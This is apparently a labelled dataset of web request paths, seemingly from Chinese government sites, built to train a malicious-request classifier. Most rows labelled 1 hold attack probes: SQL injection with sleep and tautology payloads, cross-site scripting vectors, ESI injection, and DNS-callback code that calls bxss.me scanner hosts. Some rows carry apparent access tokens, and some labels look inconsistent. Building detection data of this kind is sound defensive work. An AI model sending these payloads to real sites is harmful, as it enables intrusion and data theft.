request	label
/zwxx_11337/****/201906/t20190620_1560409.html	0
/zwxx_11337/****/202003/t20200325_2001376.html	0
/****/index.html	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u6570\u5b57\u8d27\u5e01	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u5c1a\u4e4b\u604b\u7f8e\u5bb9\u7f8e\u7532\u5e97	0
/**********/system/2021/12/04/013489865.shtml	0
/****/web/search?channelid=222832&searchword=\u5f6d\u9633\u53bf\u5f20\u7389\u840d\u98df\u6742\u5e97	0
/zwxx_11337/****/201612/t20161222_303697.html	0
/**********/system/2021/10/04/javascript:window.close();	1
/****/spjj/201707/t20170717_271601.html	0
/****/bmkx/snmj/202010/w020201023592730034087.png	0
/****/jcms/interface/jtree.jsp?type=2&webid=1&password=*&userid=admin' and '1'='1	1
"/****/system/2021/09/08/013447520'""/>\</script\>\<svg/onload=alert(1524) width=100\/>.shtml"	1
/******/public/2018/04/18/86989.images/v86989_b1524034949964_app.jpg	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5b66\u4e50\u5546\u884c	0
/**/user/gallery1.php?g_name=<script>alert(77729</script>	1
"/******/web/messagebook/script/messagebook.js/""""><script>alert(5739)</script>"	1
"/****/learn/ostickrc/scp/tickets.php?a=export&h=9c2601b88c05055b51962b140f5121389&status="" onmouseover=""alert(777)"""	1
"/******/mydevice/index.jsp?locale=""""><script>alert(777)</script>"	1
/**/images/bg_map.jpg	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5434\u5fe0\u5e02\u671d\u9633\u4f9b\u70ed\u4e2d\u5fc3	0
/**/system/2021/11/05/012216977.shtml	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u4e2a\u4f53\u7ecf\u8425\u6e90\u946b\u7cae\u6cb9\u76f4\u9500\u90e8	0
/**/ico/nv_a.jpg	0
/**********/system/2021/12/17/013496067.shtml	0
/****/b-e974765.html	0
/**********/system/2021/10/06/013460620.shtml	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u53a6\u95e8\u540c\u5b89	0
/****/web/search/search?page=3;select pg_sleep(5)--&channelid=287219&searchword=1&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10	1
/**********/system/2021/02/02/013330997.shtml	0
/****/web/search?channelid=222832&searchword=\u4e91\u7aef\u772f\u4e00\u4f1a(\u9752\u5c9b)\u79d1\u6280\u53d1\u5c55\u6709\u9650\u516c\u53f8\u94f6\u5ddd\u673a\u573a\u5206\u516c\u53f8	0
/***/interface/daily_clickcount.json.jsp?callback=jquery171044882787944367064_1640016496553	0
/*******/202004/202004230904331018.html	0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u70ed\u5ea6\u7a7a\u95f4\u670d\u9970\u5e97	0
/**/index.php?do=post&id=313&c=dt&a=goods&	1
/****/zzxxgk/wsjkwyh/gzdt_3599/xxdt/202002/t20200221_162116.html	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u4e0b\u9a6c\u5173\u9547\u798f\u7965\u4e66\u5c4b	0
/****/xef_35359/yw_1295/202111/t20211124_3147277.html	0
/****/xydt/2015_hydt/index_6.html	0
/****/1012/1311.htm	0
/**********/system/2020/05/28/013172966.shtml	0
/******/system/2012/02/28/010659600.shtml	0
"/****/zdlygk/ncwywfgz/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/hlx/xmb_gzdxb.htm"	1
/****************/notification?access_token=983988b9-bef1-4427-ada1-78099b396ac4&id=undefined	0
"/***//*/-->'""""></iframe></script></style></title></textarea><script >alert(53091)</script>"	1
/**********/system/2016/12/24/012211967.shtml	0
/***/0/01/93/32/1933223_999764.gif	0
/****/rsrm/201703/w020170728623086134263.jpg	0
"/******/'""""()&%<acx><script >4ylc(9832)</script>/phone.js"	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5b81\u4e1c\u4e07\u7a0b\u4e94\u91d1\u5efa\u6750\u7ecf\u9500\u90e8	0
/**********/system/2020/07/01/013196644.shtml	0
/zwxx_11337/****/202006/t20200618_2140675.html	0
/******/lzqh/img3/img/b.jpg	0
/****************/notification/negotiate?access_token=e0ed1271-d854-4f98-85d7-742c515ee804	0
/******/system/2019/08/20/012954857.shtml	0
"/****/czgk/bmyjs/zzqjcyxt/qtxsjcy/\""javascript:void(0)\"""	1
/****/xxgkml/qtfdxx/zfwzjgndbb/2020ndbb/szfbm/202101/p020210122368962789694.pdf	0
/****/20211206/10842.html	0
/*******/qiye/businesses-e46325_4.html?category_id=	0
/**********/system/2021/02/21/013339200.shtml	0
/****/yzw/tpbd/	0
/***/2020/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/15/art_31_223689.html	1
/****/byyw/202112/t20211216_197876.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u533a\u4e2a\u4f53\u7ecf\u8425\u5ddd\u5473\u9999\u706b\u9505	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtjru1ezjtj1howucntqdxd8=&openid=ovl7jjpi272tmu1eqbkhpmrxaeng&outer_str=11982&activate_ticket=fdzv9emqaffrnr3xboqhbwyxralgtq/gymw0hpjgbwrhfifidrt1ejnprxbtx1zvblnl3mq8ka6jm50d4e/y4xnwoicwgqgfsalu2szerkk=	0
"/***/index.html/*/-->'""""></iframe></script></style></title></textarea><script >alert(44242)</script>"	1
"/**/"" and ""x""=""y"	1
/*******/qiye/20211119/e141817532.html	0
/***/003/004/479/00300447953_96c11d6d.jpg	0
/******/usercenter/index?qrcode=14411&code=011vqrll2ui1l84dryol2zqszw0vqrld	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u8001\u57ce\u533a\u7537\u4f9d\u9601	0
/****/b-e470583.html	0
/****/bysw/swsj/201610/t20161010_456.html?leader='.gethostbyname(lc('hithu'.'obczymgn40f1c.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(119).chr(71).chr(103).chr(78).'	1
/****/xqdt/jtx/201610/t20161025_43754.html	0
"/*/210909-2/'""""()&%<acx><script >9hvh(9601)</script>/d00139fee967b9a5c83cbe1cd7e911f8.css"	1
/**********/tptt/	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u55b5\u8463\u6b22\u8fa3\u5575\u5575\u9c7c\u9910\u5385	0
/****/tzgg/tz16/201612/images/ly_xq_rr_08.png	0
/****/xqdt/hnx/201901/t20190109_113287.html	0
/***/0/01/93/64/1936476_140410.jpg	0
/**********/system/2020/12/21/013306541.shtml	0
/zwxx_11337/****/201810/t20181030_1142291.html	0
/******/error-not-supported-platform.html?desktop_url=javascript:alert(1337);//itms://	1
/****/web/search?channelid=299868&perpage=1000%') or 8141=8223 and '%'='	1
/****/qzfwj/201801/t20180115_668952.html	0
/****/web/search?channelid=299868%') or 5895=5895 and '%'='&perpage=1000	1
"/***/col68/index.html/<img src=""javascript:alert(3397)"">"	1
/****/system/2006/08/23/000001309.shtml	0
/**********/system/more/222000000000000/0002/222000000000000_00000277.shtml	0
/*******/201903/201903271021201036.html	0
/****/dqgz/202005/t20200513_247085.html	0
/***/2020/12/14/art_31_0'xor(if(now()=sysdate(),sleep(15),0))xor'z.html	1
/****/cgi-bin/ipinfo.cgi?alert(777)	1
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u5174\u9686\u4e61\u5df4\u4f6c\u7f8a\u8089\u6ce1\u998d\u5e97	0
/*****/?loginid=00355819&stamp=1639972866245&token=33ec3549784e2cc5b73c41f73dcbc26dccaefe79&hrn=00355819	0
/****/system/2020/04/09/javascript:void(0);	1
/****/ztjj2022lz/lhsd/lhsdt/index.shtml	0
/zwxx_11337/****/202110/t20211013_3086325.html	0
/***/0/02/12/44/2124405_936815.jpg	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u9752\u5c9b	0
/****/qzfwj/202111/t20211109_3121543.html	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u53cc12	0
/****/czgk/bmjs/zzqfyxt/plxrmfy/	0
/****/20201125/e111078893.html	0
/******/download/downfile.jsp?classid=0&filename=8ffb8746f7374969ba1a903f538b94d4.doc' and 5863=3929 and 'beet'='beet	1
/**/http://bxss.me/t/fit.txt?.jpg/lib/easyui/plugins/jquery.panel.js	1
/**********/system/2021/10/27/013471135.shtml	0
/************/common-problem/jyxg%' and 2*3*8=6*8 and 'tn7j'!='tn7j%/2017-02-15/405.html	1
/****/web/search?channelid=222832&searchword=\u5f6d\u9633\u53bf\u5b66\u6167\u8d27\u8fd0\u90e8	0
/****/zzxxgk/bmswj/xxgkml/ghjh/list.html	0
/**********/system/2021/12/16/013495098.shtml	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u65f6\u5c1a\u4f73\u4eba\u7f8e\u5986	0
/****/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user	1
"/******/457/lmy<esi:include src=""""http://bxss.me/rpb.png""""/>.css"	1
/****/jtdt/jt17_6388/index_2.html	0
/******/system/2021/11/07/013476607.shtml	0
/****/2021_jtyw/202108/t20210803_313529.html	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u751f\u4ebf\u852c\u83dc\u7cae\u6cb9\u7ecf\u9500\u90e8	0
/****/czgk/bmyjs/zzqfyxt/jfqrmfy/index_1.html	0
/****/zgsdt/2021_qydt/202112/w020211215835293699866.jpg	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u585e\u4e0a\u6625\u519c\u4e1a\u4e13\u4e1a\u5408\u4f5c\u793e	0
/*******/qiye/b-e2178806.html	0
/**********/system/2021/09/01/013443148.shtml	0
/******/public/2021/11/24/20211124_17d4f736ac8_r1_1200k.f4m	0
/*******/qiye/b-e701135.html	0
"/**/ui/lib/easyui/themes/bootstrap<esi:include src=""""http://bxss.me/rpb.png""""/>/linkbutton.css"	1
/****/gjjskmhxq/rwfc_157/201412/t20141218_49305.html	0
/****/b-e1258632.html	0
/****/qzfwj/202101/t20210104_2550693.html	0
/zwxx_11337/***/202010/t20201023_2265334.html	0
/***/765-97j.html	0
"/****/zfxxgk/"""" """"a"""".concat(70-3).concat(22*4).concat(113).concat(85).concat(119).concat(84) (require""""socket""""
socket.gethostbyname(""""hithr"""" """"dlfqqflla809b.bxss.me."""")[3].to_s) """"/qtfdxx/qzqd/202011/t20201106_2279316.html"	1
/****/system/2020/06/30/013195551.shtml	0
/**/actionhandler/ajax_managed_services.php	1
/***/003/004/432/00300443275_f7ca6aa5.jpg	0
/**********/system/2020/04/24/013148025.shtml	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u540d\u811a\u70b9\u978b\u5e97	0
/****/byyw/201907/t20190710_139567.html	0
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u660e\u4f0a\u996d\u5e97	0
/****/zgsdt/' and 'x'='y	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u9676\u9759\u6d77\u6c34\u6696\u7ecf\u9500\u90e8	0
/****/zzxxgk/czj/zfxxgkml_2139/czyjsxx/201906/t20190606_137742.html	0
/**/system/2021/10/25/012210896.shtml	0
/******/2018index/dian1.png	0
"/*******/?cmd=new_section§ion=""%3<script>alert(777);</script>"	1
/****/czgk/bmjs/qtdw/zzqnfb/201808/t20180816_978243.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u9999\u82d1\u5e73\u4ef7\u5546\u5e97	0
"/*********/index/login/index.html?fromurl=st4r7s<html	onmouseover = confirm()//3nd"	1
/******/web/jpage%' and 2*3*8=6*8 and 'djtt'!='djtt%/theme/default/css/jpage.css	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5b81\u4e1c\u660e\u73e0\u7406\u53d1\u5e97	0
/zwxx_11337/****/index_65.html	0
"/0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z/**/widgets/scrollup/css/themes/image.css"	1
/zwxx_11337/****/201904/w020190425358447444128.jpg	0
/**********/system/2014/12/06/011576214.shtml	0
/****/show-21290-3495-92184about/xwzx/zgsdt/2021_qydt/202111/xwzx/jtdt/2021_jtyw/202111/xwzx/mtgz/2021_mtgz/202105/xwzx/ztbd/	0
/***/blockdata/getsearchinfo.do?&title=\u6c38\u5b9a\u82b1\u679c\u5cea	0
/*****/gy42/cpgyss.asp?key=\u4f9b\u5e94\u5c71\u4e1c\u6563\u70ed\u5668\u5382&showpage=1&l=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd	0
/*******/qiye/b-e239847.html	0
/****/bmkx/slyj/index_wap_11.html	0
/*****/system/2021/11/14/javascript:void();	1
/****/wd-demo/index.php?c=prompt(777)	1
/****/zt/msss/msxw/202006/t20200617_2139570.html	0
"/******/0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z/slick.css"	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u9633\u6d77\u4e30\u5546\u8d38\u6709\u9650\u516c\u53f8	0
/****/zt/2019wznb/xjzf/202001/p020200116649168511158.pdf	0
/***/mobile_h5/waparticledetail.do?article_id=201812111516451086&contenttype=article	0
/****/	1
/******/web/jpage/dataproxy.jsp?endrecord=15&perpage=5&startrecord=1	1
/****/pucgfpinfo/querycgdjbyitemcode.z	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u5411\u4e1c\u8d27\u7269\u8fd0\u8f93\u90e8	0
"/************/template/jcse/110105008056111/16/"""" """"a"""".concat(70-3).concat(22*4).concat(119).concat(87).concat(102).concat(85) (require""""socket""""
socket.gethostbyname(""""hituh"""" """"ymfhwuxieb762.bxss.me."""")[3].to_s) """"/plugin/selectpick/js.js"	1
/****/whs/yw_1286/202010/t20201026_2266796.html	0
/****/yfyfwpt/gjgcjsyjzx/' and 'x'='x	1
/****/bmkx/swjw/202112/w020211204455661740043.jpg	0
/****/main/admin/configure_extensions.php?display=</script><script>confirm(777)</script>	1
/****/tpxw/	1
/**********/system/2018/08/20/012682157.shtml	0
/****/czgk/bmyjs/zzqjcyxt/ycsrmjcy/201702/t20170207_318492.html	0
"/****/河南自由贸易试验区?page='""""()&%<acx><script >yd4c(9028)</script>"	1
/*******/jlcorevalue?id=51);select pg_sleep(5)--	1
/****/czgk/bmjs/zzqfyxt/ltqrmfy/202108/t20210818_2980332.html	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u7545\u987a\u901a\u7269\u6d41\u7f6e\u4e1a\u6709\u9650\u516c\u53f8	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u7d2b\u60a6\u8336\u697c	0
"/***/template.cfm?fusebox.ajax="""">alert(777)&myfusebox.originalcircuit=clogin"	1
/*******/qiye/e142314760.html	0
"/0""""xor(if(now()=sysdate(),sleep(3),0))xor""""z/**********/video/index_2.html"	1
/**********/system/2020/04/28/013151050.shtml	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u9f9a\u6cbb\u96c4\u67b8\u675e\u8d2d\u9500\u7ecf\u7eaa\u4eba	0
/****/gggs/201710/t20171031_96580.html	0
/*****/system/2021/11/08/javascript:void();	1
/****/zgsdt/zgs16/index_4.html	0
/'.gethostbyname(lc('hitfc'.'mchzjgnacef4f.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(117).chr(80).chr(121).chr(73).'/*****/201610/t20161016_531.html	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u6e05\u6e90\u7965\u673a\u68b0\u8bbe\u5907\u79df\u8d41\u6709\u9650\u516c\u53f8	0
/***/0/01/32/49/1324905_426477.jpg	0
/****/css/style00.css	0
/****/index_12.html	0
"/****/form.jspx?id=1060&channelid="";window.top._web_js_namespace_taint_tracer.log_execution_flow_sink()""//"	1
/****/tusby/xdny/201812/w020181206565619553805.png	0
/**/ui/bxss.me/security/sm2.js	1
/**********/system/2020/04/18/013143505.shtml	0
/***/0/01/16/81/1168197_465457.png	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u6d01\u6b23\u5e7f\u544a\u90e8	0
/****/web/search?channelid=222832&searchword=\u5f6d\u9633\u53bf\u4e30\u76c8\u79cd\u690d\u4e13\u4e1a\u5408\u4f5c\u793e	0
/****/bmkx/swjw/202112/t20211204_197301_wap.html	0
/****/bmkx/hszh/202112/t20211220_197988.html	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u8f89\u714c\u65e5\u6742\u95e8\u5e02\u90e8	0
/****/zhengce/zfwjn/202112/t20211206_197382_wap.html	0
/**********/system/2021/12/10/javascript:window.close();	1
/****/bmkx/sgsj/	0
"/***/col269/index.html/""><script>alert(589)</script>"	1
/****/bmkx/sfgw/202008/w020200826359183510167.jpg	0
//***********/wdsjs/hfswsj/zmhdyc.html	1
/*****/gy42/cpgyss.asp?key=\ufffd\ufffd\u02bd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u06f8\ufffd&l2=\ufffd\ufffd\ufffd\ufffd&l=\u027d\ufffd\ufffd	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u8fde\u4e91\u6e2f\u6d77\u4ea7\u54c1\u5546\u884c	0
/__local/*/01/9d/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/******/system/2019/08/27/012959388.shtml	0
/****/tzgg/202012/p020201230622240620245.pdf	0
/***/003/004/504/00300450430_i1000200000135be_7aa85f52.jpg	0
/zwxx_11337/****/202003/t20200310_1984656.html	0
/****/\u02ff\ufffd\ufffd\u0132\ufffd\ufffd\ufffd	0
"/************/template/jcse'""""()&%<acx><script >cfou(9952)</script>/110105008056111/16/images/result.css"	1
/***/smarty/plugins/rose.php	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u7a46\u6492\u7802\u9505\u65fa\u7802\u9505\u5e97	0
/****/mytag_js.php?aid=769394	1
/****/web/search?channelid=222832&searchword=\u77f3\u5634\u5c71\u5e02\u60e0\u519c\u533a\u4e07\u519b\u8d27\u8fd0\u90e8	0
/****/2021_ddh/2021ddh_jcry/202105/w020210525506567593267.jpg	0
/zwxx_11337/****/202105/t20210518_2842606_zzb.html	0
/****/zt/hjbhdc/202112/t20211214_3220666.html	0
/******/qhkc/img4/9.png	0
/****/0823/653495_3.shtml	0
/*****/netflow/jspui/j_security_check?radiususerenabled=false&authrule_name=authenticator&j_username=admin52f43'><script>alert(777)</script>6f472a19875&j_password=admin	1
/**/system/2020/07/26/012032855.shtml	0
/****/system/2021/09/19/javascript:window.close();	1
/**********/system/2020/08/11/013224181.shtml	0
/****/web/search?channelid=222832&searchword=\u5f6d\u9633\u53bf\u805a\u8f89\u5de5\u8d38\u6709\u9650\u516c\u53f8	0
/*****/20210825/10342.html	0
"/****/category/guowaishichangzhunru?page=1*/-->'""""></iframe></script></style></title></textarea><script >alert(97197)</script>"	1
/*******/ray11qf.php	1
/****/qzfwj/201801/t20180115_669043.html/index_1.html	0
/****/bmkx/jtysj/201612/t20161201_79094.html	0
/******/system/2016/09/13/012129674.shtml	0
/****/web/search?channelid=222832&searchword=\u539f\u5dde\u533a\u4e09\u8425\u9547\u7ea2\u5174\u7f8e\u53d1\u5e97	0
/ter_prd/******/js/app.4d0018ad8d875e9101cc.js	0
/****/system/2021/05/03/javascript:window.print()	1
"/****/gfxwj/202012/""></a>-->"	0
/***/interface/url_total_pv.json.jsp?callback=jquery19108361464334262547_1639990822527	0
/**********/system/more/208000000000000/0002/208000000000000_00000286.shtml	0
/**********/system/2014/10/04/011522191.shtml	0
/****/czgk/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/zzqnky/	0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u8fbe\u6c34\u519c\u7267\u4e13\u4e1a\u5408\u4f5c\u793e	0
/zwxx_11337/****/202109/t20210901_2999457.html	0
/***/blockdata/getsearchinfo.do?&title=\u4e0a\u6d77\u94f6\u884c\u80a1\u4efd\u6709\u9650\u516c\u53f8 \u7f6a\u7f94\u7f8a	0
/**/system/2021/11/24/012225048.shtml	0
/***/003/004/427/00300442744_e562817d.jpg	0
/zwxx_11337/****/201908/t20190808_1655865.html	0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u5fb7\u80dc\u745e\u9a70\u4e30\u4e8c\u624b\u8f66\u54a8\u8be2\u670d\u52a1\u90e8	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u65fa\u5b8f\u5546\u884c	0
/******/resource/interview/room.jsp?wbinterviewid=1033' and 0863=0863 and '1'='1&owner=1707212448	1
/zwgk'||'/*****/flfg.htm	1
/****/jtdt/2021_jtyw/202106/t20210626_294427.html	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrto1fpxnb1lzx2agznbdcxkq=&openid=ovl7jjjidhxsyu4rwd4zl_nsfzpy&outer_str=34369&activate_ticket=fdzv9emqaffrnr3xboqhb1azvez0ouwbisxysv9zvjzoo8dbj5 fzedtzplsmcarv6yy5bgckk1qtpp537cbi5b73obdj6lg rjdgidsik0=	0
/****/system/2021/08/27/013440735.shtml	0
/****/czgk/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/zzqgxs/201802/t20180223_693441.html	0
/****/zycwxx/202011/t20201113_255857.html	1
"/****/system/2021/09/01'""/><img src=javascript:alert(1852) /013442863.shtml"	1
/**********/system/2021/12/15/013495014.shtml	0
/****/zfgb/2018/201806/p020180614528832000882.pdf	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u9495\u738b\u7f8e\u5986\u5ac1\u8863\u9986	0
/****/ygzpxx/202008/t20200807_251715.html' and 'x'='y	1
"/**/files.php?folder="""">alert(777)"	1
/****/0221/764122.shtml	0
/****/system/2021/07/21/javascript:window.print()	1
/**********/tjqh/theme/image/dih.jpg	0
/****/bmkx/sajj/201610/w020161025685392199212.jpg	0
/*******/0bc2.php	1
/****/bmkx/ygjt/201802/t20180224_100494.html	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u82b1\u751f\u8282	0
/***/0/00/21/16/211663_232103.jpg	0
/**********/system/2021/12/20/013496884.shtml	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u76fc\u76fc\u6c5f\u5357\u5c0f\u5403\u5e97	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u79e6\u4e1c\u9910\u5385	0
/******/resource/code/news/click/dynclicks.jsp?clickid=1223&owner=1329914701&clicktype=wbnews	0
/****/web/search?page=247&channelid=222832&searchword=\u54b8\u8f89&keyword=\u54b8\u8f89&perpage=20&outlinepage=10	0
/***/0/01/80/97/1809741_151057.jpg	1
/****/gjzqq/index.html?continent=%') or 2123=5635 and '%'='	1
"/******/visitcount/visit.jsp?type=1"";select 1;&i_webid=1&i_columnid=1"	1
/***/wxzcgk/202007/t20200728_2174227.html	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u96e8\u96e8\u5546\u5e97	0
/****/zfxxgk/fdzdgknr/lzyj/gfxwj_40892/202002/t20200211_1950368.html	0
/****/gjzqq/fz/zby/201412/w020141212327769069954.gif	0
"/**/vc/interface/visit.jsp?i_articleid=0&i_columnid=264&i_webid=1&type=2&url=0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z"	1
/****/xef_35359/yw_1295/202105/t20210524_2851783.html	0
/****/wlzj/202103/bxss.me/t/xss.html?	1
/****/bmkx/jkzx/202105/t20210518_182698.html	1
/******/usercenter/index?qrcode=91148	0
/****/baishi3zhucepingtai.html	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(3504)"">?_=1630311912001"	1
/****/web/search?channelid=299868&perpage=1000 and 8910=4921	1
/****/system/2020/03/30/javascript:void();	1
/****/202112/t20211206_197325.html	0
/****/zfwjn/201906/t20190614_137960.html	0
/****/category/yidaiyiluwenda?page=1 and 1170=3233--	1
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtnyg0fyc yrae0yxrd05cwk=&openid=ovl7jjirycym9zriqr9rab-p1p-c&outer_str=9042&activate_ticket=fdzv9emqaffrnr3xboqhbwdm6ecklxwzrpbsfvrsncphfifidrt1ejnprxbtx1zvtyhtw45trdxxcslvc ugatlcwsrfarwr51a1di8kfzu=	0
/**********/system/2021/12/12/013493303.shtml	0
/****/bmkx/sjsj/202012/t20201222_175120.html	0
/****/xxgkml/hygq_3720/rdhy/202108/t20210823_185979.html	0
/**********/system/2021/12/21/013497450.shtml	0
/****/2019_tzgg	0
/**/phppressrelease/administration.php?pageaction=saverelease&subaction=submit&dateday=&datemonthnewedit=&dateyearnewedit=&title=<script>alert('777')</script>&summary=deneme&releasebody=deneme&categorynewedit=1&publish=active	1
/***/2021/2/18/art_263_226352.html	0
/**********/2017-if(now()=sysdate(),sleep(3),0)-12.html	1
/*******/qiye/20211127/e142531887.html	0
/****/mtgz/2011mtgz/201412/t20141218_44791.html	0
/****/bygk/shsy/201907/url	0
/***/0/10/66/19/10661928_961873.jpg	1
/**/web/sa2/scriptlist.do?gui_pagenotabledata=><script>alert(777)</script>	1
/****/zxxx/content.html?metadataid=10062552	0
/****/category/chukoufengxianyujing?page=1%') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),6)--	1
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u533a\u767e\u5473\u5168\u8c03\u5473\u54c1\u5e97	0
"/************/template/jcse/110105008056111/16/images/jquery.autocomplete.js/<img src=""javascript:alert(2156)"">"	1
/***/mavideo/gvideos.php?gid=1 and 1=2	1
/***/0/02/09/12/2091295_921976.png	0
/**********/system/2020/04/02/013131021.shtml	0
/************/categorysearch.do?cateid=1&eq=1&oq=1&p=1&pg=15&pos='.gethostbyname(lc('hitni'.'nwvyeynk12894.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(113).chr(77).chr(107).chr(80).'&pq=1&q=请输入关键词&ranksign=1&searchid=1&total=1&tpl=16&websiteid=110105008056111	1
"/****/annonce/moteur-prix.php?categoriemoteur=1"""">alert(777);"	1
/*/tools_log_setting.php?action_post=something&send_mail=--><script>alert(777)</script>&apply=save settings&log_sys=1&log_dbg=1&log_att=1&log_drp=1&log_ntc=1&email_addr=&subject=&sender=&srv=&srv_port=25	1
"/****/gg.shtml/""><script>alert(291)</script>"	1
/****/web/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/xqdt/byq/201806/t20180627_104811.html	0
/****/qzfwj/202107/t20210707_2914856.html	0
/**********/system/2021/11/29/013487596.shtml	0
"/**/reviews/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="""">alert(/777/)&false_positives=without&sort=&asc=false&commit=search"	1
/******/sxx/css/1.css	0
/****/system/2017/03/09/javascript:window.close();	1
/**/system/2021/11/07/012217333.shtml	0
/**********/bxhs/index.shtml	0
/****/web/search?channelid=299868%' and 9077=0571	1
/if(now()=sysdate(),sleep(9),0)/**********/video/index_2.html	1
